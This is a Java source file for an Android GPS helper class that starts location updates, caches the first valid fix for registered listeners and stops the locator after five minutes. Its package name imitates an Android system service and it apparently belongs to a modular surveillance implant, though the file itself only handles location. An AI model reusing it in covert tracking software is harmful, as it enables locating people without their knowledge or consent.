package com.android.service.module.position;

import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

import com.android.service.Status;
import com.android.service.auto.Cfg;
import com.android.service.util.Check;

import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;

public class GPSLocatorAuto implements LocationListener, Runnable {

	private static final String TAG = "GPSLocatorAuto";

	private static GPSLocatorAuto instance;
	private boolean started = false;
	private List<LocationListener> listeners;
	private GPSLocatorPeriod locator;
	
	private long stopDelay = 5 * 60 * 1000;
	private boolean gotValidPosition;

	private GPSLocatorAuto() {
		listeners = new ArrayList<LocationListener>();
	}

	public static GPSLocatorAuto self() {
		if (instance == null) {
			synchronized (GPSLocatorAuto.class) {
				if (instance == null) {
					instance = new GPSLocatorAuto();
				}
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " (self): new instance");
			}
		}
		return instance;
	}

	/**
	 * Lo start del module position chiama questo metodo che: lancia il
	 * GPSLocator se necessario, contestualmente ad un timer di 5 minuti, al
	 * termine del quale il GPSLocator viene chiuso. se ha una posizione valida
	 * la restituisce via callback senno' aggiunge il richiedente alla lista,
	 * che verra' svuotata al primo fix.
	 * 
	 * @param listener
	 */
	public synchronized void start(LocationListener listener) {
		if (!started) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (start): new GPSLocatorPeriod");
			}
			started = true;
			locator = new GPSLocatorPeriod(this, 1000);
		}

		Handler handler = Status.self().getDefaultHandler();
		handler.removeCallbacks(this);
		handler.postDelayed(this, stopDelay);

		if (gotValidPosition) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (start): got Valid position, return it");
			}
			listener.onLocationChanged(locator.getLastKnownPosition());
		} else {
			if (!listeners.contains(listener)) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (start): adding to listeners");
				}
				listeners.add(listener);
			}
		}

	}

	/** executed by handler postDelayed, 5 minutes after the last start */
	public synchronized void run() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (run) passed without start: " + stopDelay);
		}
		if (started) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (run): stopping locator");
			}
			started = false;
			locator.stop();
			locator = null;
			gotValidPosition = false;
		}
	}

	/**
	 * This method is called by the GPSLocator the first time it fixes
	 */
	public synchronized void onLocationChanged(Location location) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (onLocationChanged): new location: " + location);
		}
		gotValidPosition = true;
		for (LocationListener listener : listeners) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (onLocationChanged): send location to: " + listener);
			}
			listener.onLocationChanged(location);
		}
		listeners.clear();
	}

	public void onProviderDisabled(String provider) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (onProviderDisabled)");
		}
	}

	public void onProviderEnabled(String provider) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (onProviderEnabled)");
		}
	}

	public void onStatusChanged(String provider, int status, Bundle extras) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (onStatusChanged)");
		}
	}

}
